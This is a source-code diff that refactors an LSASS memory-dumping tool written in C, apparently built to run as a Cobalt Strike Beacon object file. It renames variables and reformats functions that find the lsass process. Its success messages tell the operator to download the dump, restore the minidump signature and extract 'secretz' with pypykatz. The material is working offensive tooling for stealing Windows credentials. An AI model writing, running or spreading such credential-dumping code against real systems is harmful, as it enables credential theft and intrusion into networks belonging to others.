@@ -395,7 +395,9 @@ BOOL file_exists(
     return TRUE;
 }
 
-PVOID get_process_image(HANDLE hProcess)
+PVOID get_process_image(
+    HANDLE hProcess
+)
 {
     NTSTATUS status;
     ULONG BufferLength = 0x200;
@@ -425,7 +427,9 @@ PVOID get_process_image(HANDLE hProcess)
     return NULL;
 }
 
-BOOL is_lsass(HANDLE hProcess)
+BOOL is_lsass(
+    HANDLE hProcess
+)
 {
     PUNICODE_STRING image = get_process_image(hProcess);
     if (!image)
@@ -471,19 +475,19 @@ DWORD get_pid(
 
 DWORD get_lsass_pid(void)
 {
-    DWORD pid;
+    DWORD lsass_pid;
     HANDLE hProcess = find_lsass(PROCESS_QUERY_INFORMATION);
     if (!hProcess)
         return 0;
-    pid = get_pid(hProcess);
+    lsass_pid = get_pid(hProcess);
     NtClose(hProcess); hProcess = NULL;
-    return pid;
+    return lsass_pid;
 }
 
 void print_success(
-    LPCSTR dump_name,
+    LPCSTR dump_path,
     BOOL use_valid_sig,
-    BOOL do_write
+    BOOL write_dump_to_disk
 )
 {
     if (!use_valid_sig)
@@ -494,21 +498,21 @@ void print_success(
         printf(
 #endif
             "The minidump has an invalid signature, restore it running:\nbash restore_signature.sh %s",
-            do_write? &strrchr(dump_name, '\\')[1] : dump_name
+            write_dump_to_disk? &strrchr(dump_path, '\\')[1] : dump_path
         );
     }
-    if (do_write)
+    if (write_dump_to_disk)
     {
 #ifdef BOF
         BeaconPrintf(CALLBACK_OUTPUT,
             "Done, to download the dump run:\ndownload %s\nto get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-            dump_name,
-            &strrchr(dump_name, '\\')[1]
+            dump_path,
+            &strrchr(dump_path, '\\')[1]
         );
 #else
         printf(
             "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-            &strrchr(dump_name, '\\')[1]
+            &strrchr(dump_path, '\\')[1]
         );
 #endif
     }
@@ -520,7 +524,7 @@ void print_success(
         printf(
 #endif
             "Done, to get the secretz run:\npython3 -m pypykatz lsa minidump %s",
-            dump_name
+            dump_path
         );
     }
 }
